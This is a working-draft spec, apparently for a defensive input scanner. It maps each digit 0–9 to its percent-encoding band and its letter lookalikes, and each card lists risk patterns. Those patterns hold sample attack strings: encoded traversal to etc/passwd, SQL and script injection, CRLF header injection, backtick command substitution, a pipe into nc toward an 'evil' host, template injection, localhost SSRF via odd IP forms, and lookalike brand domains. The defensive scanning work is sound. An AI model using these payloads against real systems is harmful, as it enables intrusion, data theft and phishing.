ЧАСТНЫЙ АВТОРСКИЙ ПРОЕКТ / COMMERCIAL USE PROHIBITED

PER-DIGIT SIGN CARDS (DRAFT) — цифры 0–9 (полный ряд)
INHERITS_FROM: SIGN_CORE_CARD_DIGIT_CLASS_0-9_GEN3_v0_1_RU
TEMPLATE_LINE: GEN3_v0_3
STATUS: WORKING_DRAFT / NOT_LOCKED / NOT_RUNTIME / NOT_VALIDATOR / NOT_PRODUCTION

DRAFT_NOTE (2026-07-20): десять per-digit карточек как ДЕЛЬТА к классовой.
  Наследуют разделы 0,1,2,3,5,6 (эффекты=NONE, дисциплина, universality).
  Здесь только 4 (IDENTITY DELTA) и 7 (SAFE/RISK DELTA). Для конвейера каждую
  вынести в SIGN_CORE_CARD_DIGIT_<N>_GEN3_v0_1_RU. Не прогонялись через конвейер.

================================================================
СИСТЕМНЫЙ ПРИНЦИП (почему карточки разные, а не копии)
================================================================
Каждая цифра N — старший полубайт своей полосы ASCII, поэтому в percent-
кодировке она ВЕДЁТ ровно 16 символов %Nx = 0xN0…0xNF. Десять цифр полосами
покрывают ВСЮ таблицу percent-кодирования. Отсюда CARRIER-роль каждой цифры
задана не мнением, а таблицей:

  0 → %0X  C0-упр.: %00 NUL, %09 TAB, %0A LF, %0D CR      (null-byte, CRLF)
  1 → %1X  C0-упр.: %1B ESC                               (слабый)
  2 → %2X  пунктуация: %2E "." %2F "/" %27 "'" %22 '"'    (traversal, кавычки)
  3 → %3X  метасимволы: %3C "<" %3E ">" %3A ":" %3D "="   (XSS, URL)
  4 → %4X  %40 "@" + A–O                                  (userinfo/mention)
  5 → %5X  %5C "\" %5B "[" %5D "]" + P–Z                  (Windows-traversal)
  6 → %6X  %60 "`" + a–o                                  (command-subst)
  7 → %7X  %7C "|" %7B "{" %7D "}" %7F DEL + p–z          (pipe, SSTI-скобки)
  8 → %8X  C1-упр. / UTF-8 continuation (%85 NEL)         (high-byte)
  9 → %9X  C1-упр. / UTF-8 continuation (%9B CSI)         (high-byte)

SURFACE-роль (двойник буквы) распределена отдельно, по форме глифа:
  0↔O  1↔l/I/|  2↔Z(слаб)  3↔E/З  4↔A  5↔S  6↔b/G  7↔T  8↔B  9↔g/q
Плюс у каждой не-ASCII двойники (полноширинные ０-９, арабо-индийские ٠-٩).

Для каждой цифры также: она — октет IP-хоста (SURFACE, сетевой слой).

================================================================
CARD: DIGIT 0   ID: SIGN_CORE_CARD_DIGIT_0_GEN3_v0_1_RU
================================================================
STATUS: WORKING_DRAFT / PREFLIGHT PENDING / CONVEYOR_REVIEW PENDING / NOT CLOSED
--- 4. IDENTITY DELTA ---
VISIBLE_FORM: 0
SPECIAL_ROLES: radix-триггер (ведущий 0=octal, 0x=hex, 0b=bin);
  wildcard/null-хост ("0","0.0.0.0"); сильный двойник буквы O
CARRIER_LEAD: %0X → управляющие (%00 NUL, %0A LF, %0D CR)
FORMULAS: ZERO_FORM ≠ LETTER_O ; ≠ HOST_VALIDITY_PROOF ; ≠ FINAL_SURFACE
CONFUSABLES: O U+004F(HIGH), о U+043E(HIGH), ० U+0966(MED), ٠ U+0660(MED), ０ U+FF10(MED)
--- 7. SAFE/RISK DELTA ---
SAFE: "0 непрочитанных" | "баланс 0.0" | "версия 0.9"
RISK:
  R0-1 O_LOOKALIKE_BRAND "g00gle.com"/"micr0soft"  HIGH  GUARD ZERO_FORM ≠ LETTER_O
  R0-2 OCTAL_HEX_IP "http://0177.0.0.1"/"http://0x7f000001"  HIGH  (нормализовать основание)
  R0-3 WILDCARD_HOST "http://0/" (=0.0.0.0=localhost)  HIGH  SSRF на localhost
  R0-4 NULL_BYTE "upload.php%00.jpg"  HIGH  обрыв строки -> обход расширения
  R0-5 CRLF "…%0d%0aSet-Cookie:evil"  HIGH  инъекция заголовков/лога

================================================================
CARD: DIGIT 1   ID: SIGN_CORE_CARD_DIGIT_1_GEN3_v0_1_RU
================================================================
STATUS: WORKING_DRAFT / PREFLIGHT PENDING / CONVEYOR_REVIEW PENDING / NOT CLOSED
--- 4. IDENTITY DELTA ---
VISIBLE_FORM: 1
SPECIAL_ROLES: сильнейший двойник l/I/|; короткая форма IP ("127.1")
CARRIER_LEAD: %1X слабый (%1B ESC) — угроза 1 ВИЗУАЛЬНАЯ
FORMULAS: ONE_FORM ≠ LETTER_L ; ≠ LETTER_I ; ≠ HOST_VALIDITY_PROOF
CONFUSABLES: l U+006C(HIGH), I U+0049(HIGH), | U+007C(MED), Ⅰ U+2160(LOW), ١ U+0661(MED), １ U+FF11(MED)
--- 7. SAFE/RISK DELTA ---
SAFE: "версия 1.0" | "шаг 1 из 5" | "1 яблоко"
RISK:
  R1-1 L_I_LOOKALIKE "paypa1.com"/"1ogin"/"1BM"  HIGH  GUARD ONE_FORM ≠ LETTER_L/I
  R1-2 SHORT_IP "http://127.1/" (=127.0.0.1)  MED  SSRF на localhost
  R1-3 PIPE_LOOKALIKE "cmd 1 rm" где 1~|  MED  визуальная маскировка pipe

================================================================
CARD: DIGIT 2   ID: SIGN_CORE_CARD_DIGIT_2_GEN3_v0_1_RU
================================================================
STATUS: WORKING_DRAFT / PREFLIGHT PENDING / CONVEYOR_REVIEW PENDING / NOT CLOSED
--- 4. IDENTITY DELTA ---
VISIBLE_FORM: 2
SPECIAL_ROLES: carrier-heavy — ведёт %2X (ОХРАНЯЕМЫЕ точка и солидус!);
  слабый двойник Z
CARRIER_LEAD: %2X → %2E "." %2F "/" %2C "," %27 "'" %22 '"' %28 "("
FORMULAS: TWO_FORM ≠ FINAL_SURFACE
CONFUSABLES: Z(LOW), ٢ U+0662(MED), ２ U+FF12(MED)
--- 7. SAFE/RISK DELTA ---
SAFE: "2 + 2 = 4" | "2.5 литра" | "H2O, COVID-2019"
RISK:
  R2-1 PERCENT_TRAVERSAL "%2e%2e%2fetc%2fpasswd"  HIGH  точка/слэш собраны -> мимо их карточек (PRE_PASS)
  R2-2 ENCODED_QUOTE_SQLI "id=1%27--" (%27="'")  HIGH  SQL-инъекция мимо фильтра кавычек
  R2-3 ENCODED_QUOTE_XSS "%22%3E" (%22='"')  MED  выход из атрибута

================================================================
CARD: DIGIT 3   ID: SIGN_CORE_CARD_DIGIT_3_GEN3_v0_1_RU
================================================================
STATUS: WORKING_DRAFT / PREFLIGHT PENDING / CONVEYOR_REVIEW PENDING / NOT CLOSED
--- 4. IDENTITY DELTA ---
VISIBLE_FORM: 3
SPECIAL_ROLES: carrier-метасимволы — ведёт %3X; двойник E/З (leet)
CARRIER_LEAD: %3X → %3C "<" %3E ">" %3A ":" %3B ";" %3D "=" %3F "?"
FORMULAS: THREE_FORM ≠ FINAL_SURFACE ; ≠ LETTER_E
CONFUSABLES: E U+0045(MED), З U+0417(MED), ٣ U+0663(MED), ３ U+FF13(MED)
--- 7. SAFE/RISK DELTA ---
SAFE: "3.14159" | "3D, mp3" | "E3 2026"
RISK:
  R3-1 ENCODED_XSS "%3Cscript%3E…%3C%2Fscript%3E"  HIGH  <> собраны -> XSS мимо фильтра скобок
  R3-2 SCHEME_SMUGGLING "http%3A%2F%2Fevil" (%3A%2F%2F="://")  HIGH  обход проверки схемы
  R3-3 PARAM_POLLUTION "…%3Fadmin%3Dtrue" (%3F="?" %3D="=")  MED  инъекция параметра
  R3-4 LEET_E_BRAND "googl3.com"/"fac3book"  MED  GUARD THREE_FORM ≠ LETTER_E

================================================================
CARD: DIGIT 4   ID: SIGN_CORE_CARD_DIGIT_4_GEN3_v0_1_RU
================================================================
STATUS: WORKING_DRAFT / PREFLIGHT PENDING / CONVEYOR_REVIEW PENDING / NOT CLOSED
--- 4. IDENTITY DELTA ---
VISIBLE_FORM: 4
SPECIAL_ROLES: ведёт %4X (в т.ч. %40 "@" — знак карточки AT!); двойник A (leet)
CARRIER_LEAD: %4X → %40 "@" + %41–%4F = A–O
FORMULAS: FOUR_FORM ≠ FINAL_SURFACE ; ≠ LETTER_A
CONFUSABLES: A(leet, MED), Ч(стилиз., LOW), ٤ U+0664(MED), ４ U+FF14(MED)
--- 7. SAFE/RISK DELTA ---
SAFE: "4 сезона" | "4G, версия 4.2" | "Boeing 747"
RISK:
  R4-1 LEET_A_BRAND "4pple.com"/"h4ck"/"amaz4n"  MED  GUARD FOUR_FORM ≠ LETTER_A
  R4-2 ENCODED_AT_USERINFO "http://real.com%40evil.com" (%40="@")  HIGH
     ATTACK: "@" через %40 -> путаница userinfo, реальный хост = evil.com
     GUARD FOUR_FORM ≠ FINAL_SURFACE
  R4-3 ENCODED_AT_EMAIL "admin%40target" маскирует адрес-приёмник  MED

================================================================
CARD: DIGIT 5   ID: SIGN_CORE_CARD_DIGIT_5_GEN3_v0_1_RU
================================================================
STATUS: WORKING_DRAFT / PREFLIGHT PENDING / CONVEYOR_REVIEW PENDING / NOT CLOSED
--- 4. IDENTITY DELTA ---
VISIBLE_FORM: 5
SPECIAL_ROLES: ведёт %5X (в т.ч. %5C "\" — Windows-traversal!); двойник S (leet)
CARRIER_LEAD: %5X → %5C "\" %5B "[" %5D "]" %5F "_" %5E "^" + P–Z
FORMULAS: FIVE_FORM ≠ FINAL_SURFACE ; ≠ LETTER_S
CONFUSABLES: S(leet, MED-HIGH), Ѕ U+0405(MED), ٥ U+0665(MED), ５ U+FF15(MED)
--- 7. SAFE/RISK DELTA ---
SAFE: "5 звёзд" | "5.1 звук" | "Top-5, S5"
RISK:
  R5-1 LEET_S_BRAND "micro5oft"/"ca5happ"/"5cam"  MED-HIGH  GUARD FIVE_FORM ≠ LETTER_S
  R5-2 WIN_TRAVERSAL_BACKSLASH "..%5c..%5cwindows%5csystem32" (%5C="\")  HIGH
     ATTACK: обратный слэш через %5c -> Windows path-traversal мимо фильтра "\"
     GUARD FIVE_FORM ≠ FINAL_SURFACE
  R5-3 ENCODED_BRACKETS "%5b%5d"/"%5b::1%5d" (IPv6-литерал [::1])  MED  обход хост-проверки

================================================================
CARD: DIGIT 6   ID: SIGN_CORE_CARD_DIGIT_6_GEN3_v0_1_RU
================================================================
STATUS: WORKING_DRAFT / PREFLIGHT PENDING / CONVEYOR_REVIEW PENDING / NOT CLOSED
--- 4. IDENTITY DELTA ---
VISIBLE_FORM: 6
SPECIAL_ROLES: ведёт %6X (в т.ч. %60 "`" — command substitution!); слабый двойник b/G
CARRIER_LEAD: %6X → %60 "`" + %61–%6F = a–o
FORMULAS: SIX_FORM ≠ FINAL_SURFACE
CONFUSABLES: b(LOW), G(стилиз., LOW), ٦ U+0666(MED), ６ U+FF16(MED)
--- 7. SAFE/RISK DELTA ---
SAFE: "6 месяцев" | "iPhone 6" | "версия 6.0"
RISK:
  R6-1 BACKTICK_CMD_SUBST "%60id%60"/"$(%60whoami%60)" (%60="`")  HIGH
     ATTACK: backtick через %60 -> подстановка команды shell
     GUARD SIX_FORM ≠ FINAL_SURFACE
  R6-2 LEET_LOOKALIKE "6" ~ b/G в имени  LOW  визуальная подмена (слабая)

================================================================
CARD: DIGIT 7   ID: SIGN_CORE_CARD_DIGIT_7_GEN3_v0_1_RU
================================================================
STATUS: WORKING_DRAFT / PREFLIGHT PENDING / CONVEYOR_REVIEW PENDING / NOT CLOSED
--- 4. IDENTITY DELTA ---
VISIBLE_FORM: 7
SPECIAL_ROLES: ведёт %7X (%7C "|" pipe, %7B/%7D "{ }" SSTI, %7F DEL); двойник T (leet)
CARRIER_LEAD: %7X → %7C "|" %7B "{" %7D "}" %7E "~" %7F DEL + p–z
FORMULAS: SEVEN_FORM ≠ FINAL_SURFACE
CONFUSABLES: T(leet, LOW-MED), /(стилиз., LOW), ٧ U+0667(MED), ７ U+FF17(MED)
--- 7. SAFE/RISK DELTA ---
SAFE: "7 дней" | "7.1 звук" | "Boeing 747"
RISK:
  R7-1 PIPE_CMD_CHAIN "ping%20host%7cnc%20evil" (%7C="|")  HIGH
     ATTACK: pipe через %7c -> цепочка команд
     GUARD SEVEN_FORM ≠ FINAL_SURFACE
  R7-2 SSTI_BRACES "%7b%7b7*7%7d%7d" ({{7*7}})  HIGH
     ATTACK: {{ }} через %7b/%7d -> server-side template injection
     GUARD SEVEN_FORM ≠ FINAL_SURFACE
  R7-3 DEL_CONTROL "%7f"  MED  управляющий DEL для сбоя парсера/лога

================================================================
CARD: DIGIT 8   ID: SIGN_CORE_CARD_DIGIT_8_GEN3_v0_1_RU
================================================================
STATUS: WORKING_DRAFT / PREFLIGHT PENDING / CONVEYOR_REVIEW PENDING / NOT CLOSED
--- 4. IDENTITY DELTA ---
VISIBLE_FORM: 8
SPECIAL_ROLES: ведёт %8X = C1-управляющие / UTF-8 continuation; двойник B (leet)
CARRIER_LEAD: %8X → C1-controls (%85 NEL) и байты-продолжения UTF-8
  ПРИМЕЧАНИЕ: 8 — УЧАСТНИК high-byte/overlong-последовательностей, не лид
  именованного ASCII-метасимвола (лиды overlong — c/d/e/f). Несёт меньше
  отдельного веса, чем 2/3/5/6/7.
FORMULAS: EIGHT_FORM ≠ FINAL_SURFACE ; ≠ LETTER_B
CONFUSABLES: B(leet, MED), &(стилиз., LOW), ٨ U+0668(MED), ８ U+FF18(MED)
--- 7. SAFE/RISK DELTA ---
SAFE: "8 марта" | "число 8, версия 8.0" | "8K видео"
RISK:
  R8-1 LEET_B_BRAND "face8ook"/"8ing"/"8ank"  MED  GUARD EIGHT_FORM ≠ LETTER_B
  R8-2 C1_CONTROL_NEL "…%85…" (NEL как перевод строки в ряде парсеров)  MED-HIGH
     ATTACK: %85 трактуется как newline -> инъекция строки/заголовка
     GUARD EIGHT_FORM ≠ FINAL_SURFACE
  R8-3 OVERLONG_UTF8_PARTICIPANT "%c0%ae"/"%e0%80%af" (байты-продолжения)  MED
     ATTACK: overlong-кодировка "." / "/" для обхода фильтра (8 — часть цепочки)

================================================================
CARD: DIGIT 9   ID: SIGN_CORE_CARD_DIGIT_9_GEN3_v0_1_RU
================================================================
STATUS: WORKING_DRAFT / PREFLIGHT PENDING / CONVEYOR_REVIEW PENDING / NOT CLOSED
--- 4. IDENTITY DELTA ---
VISIBLE_FORM: 9
SPECIAL_ROLES: ведёт %9X = C1-управляющие / UTF-8 continuation; слабый двойник g/q
CARRIER_LEAD: %9X → C1-controls (%9B CSI — terminal escape) и байты UTF-8
  ПРИМЕЧАНИЕ: как и 8 — участник high-byte, не лид ASCII-метасимвола.
FORMULAS: NINE_FORM ≠ FINAL_SURFACE
CONFUSABLES: g(LOW), q(LOW), ٩ U+0669(MED), ９ U+FF19(MED)
--- 7. SAFE/RISK DELTA ---
SAFE: "9 мая" | "9.9, Cloud9" | "порт 9000 (dev)"
RISK:
  R9-1 C1_CONTROL_CSI "…%9b…" (CSI — управляющая последовательность терминала)  MED
     ATTACK: инъекция терминального escape в лог/консоль
     GUARD NINE_FORM ≠ FINAL_SURFACE
  R9-2 HIGH_PORT_ADMIN "http://host:9090/"  LOW  админ/ dev-порт (слабый surface-сигнал)
  R9-3 LEET_LOOKALIKE "9" ~ g/q  LOW  слабая визуальная подмена

================================================================
ОБЩЕЕ (наследуется из классовой карточки)
================================================================
LIMITATION: все десять — WORKING_DRAFT, не прошли конвейер. CARRIER-риски (все
  %Nx-кейсы) НЕ перехватываются без CANONICALIZATION_PRE_PASS (классовая, разд.10;
  прототип pre-pass уже проверен на живом MSL). SURFACE-риски (двойники, IP-хосты,
  порты) карточка флагует напрямую. Языковой слой не покрывается.
INTEGRATION: PENDING — PRE_PASS до scan_signs; взаимодействие с DOT/SOLIDUS/AT/
  INVISIBLE_CLASS. Цифры 2,3,4,5,6,7 несут наибольший carrier-вес (ведут именованные
  метасимволы); 0 — управляющие+хост; 1 — визуальный; 8,9 — high-byte-участники.
NOTE_COVERAGE: вместе карточки 0–9 полосами %0X…%9X + a–f (буквы-hex вне цифр)
  покрывают всё пространство percent-кодирования; полное покрытие требует ещё
  hex-букв A–F (отдельный вопрос: они не «цифры», но участвуют в %XX).
